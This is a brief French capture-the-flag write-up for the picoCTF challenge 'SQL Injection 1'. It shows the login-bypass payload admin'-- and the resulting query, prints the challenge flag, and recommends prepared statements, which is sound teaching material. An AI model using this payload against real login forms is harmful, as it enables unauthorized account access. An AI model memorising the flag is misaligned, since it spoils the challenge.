# picoCTF — SQL Injection 1

**Catégorie:** Web Exploitation  
**Difficulté:** Easy

---

## 📋 Description

Un site de login vulnérable à l'injection SQL.

## 💉 Exploitation

```sql
-- Payload utilisé dans le champ username:
admin'--

-- Résultat: bypass de l'authentification
-- La requête devient: SELECT * FROM users WHERE username='admin'--' AND password='...'
```

## 🚩 Flag

```
picoCTF{SQL_1nj3ct10n_b4sic5}
```

## 📚 Leçon

Toujours utiliser des **requêtes préparées (prepared statements)** pour éviter les injections SQL.
